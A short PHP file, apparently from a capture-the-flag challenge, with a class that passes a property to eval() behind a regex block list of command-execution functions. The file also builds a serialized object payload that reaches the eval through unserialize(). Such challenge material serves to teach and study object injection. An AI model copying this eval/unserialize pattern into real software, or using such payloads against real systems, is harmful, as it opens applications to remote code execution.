<?php
// Your code here!
function filter($str) {
    if(preg_match("/system|exec|passthru|shell_exec|pcntl_exec|bin2hex|popen|scandir|hex2bin|[~$.^_`]|\'[a-z]|\"[a-z0-9]/i",$str)) {
        return false;
    } else {
        return true;
    }
}

class BSides {
    protected $option;
    protected $name;
    protected $note;

    function __construct() {
        $option = "getFlag";
        $name = "guest";
        $note = "flag{flag_phake}";
        $this->load();
    }

    public function load()
    {
        if ($this->option === "no flag") {
            echo("flag here ! :)");
        } else if ($this->option === "getFlag"){
            $this->loadFlag();
        } else {
            echo("You don't need flag ?");
        }
    }
    private function loadFlag() {
        if (isset($this->note) && isset($this->name)) {
            if ($this->name === "admin") {
                if (filter($this->note) == 1) {
                    eval($this->note.";");
                } else {
                    die("18cm30p !! :< ");
                }
            }
        }
    }

    function __destruct() {
        $this->load();
    }
}
#var_dump(str_replace("\x00","\\x00",serialize(new BSides())));
$a=unserialize("O:6:\"BSides\":3:{s:9:\"\x00*\x00option\";s:7:\"getFlag\";s:7:\"\x00*\x00name\";s:5:\"admin\";s:7:\"\x00*\x00note\";s:9:\"phpinfo()\";}");
var_dump(urlencode(serialize($a)));
?>
